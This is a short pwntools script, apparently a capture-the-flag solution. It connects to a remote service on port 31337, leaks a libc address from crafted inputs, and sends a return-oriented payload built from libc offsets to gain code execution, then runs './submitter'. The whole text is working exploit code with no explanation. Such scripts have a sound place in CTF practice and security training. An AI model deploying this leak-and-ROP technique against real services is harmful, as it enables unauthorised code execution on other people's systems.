#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))
p.sendlineafter(b"?",b"10")
p.sendlineafter(b"?",b"3")
p.sendlineafter(b"?",b"a"*9+b'\xf0')
p.sendlineafter(b"?",b"\xa0"*108+b'\xff')
x=p.recvuntil(b"What is your guess #3?").replace(b"What is your guess #3?",b"").replace(b"\x1B[0m\n",b'')

libc=u64(b''.join(x.split(b" ")[1::2])[150:158])
p.sendline(b"a"*98+b'\x81'+p64(libc+0x656)+p64(libc+0x655)+p64(libc+0x1ae8e8+0x20)+p64(libc+0x26fe0-0x10-0x50D60+0x508F0))
sleep(1)
p.sendline(b"./submitter")
p.sendline(b"./submitter")
p.sendline(b"./submitter")
p.sendline(b"./submitter")
p.recvuntil(b'You lose')
# p.interactive()

print(p.recvallS(timeout=2))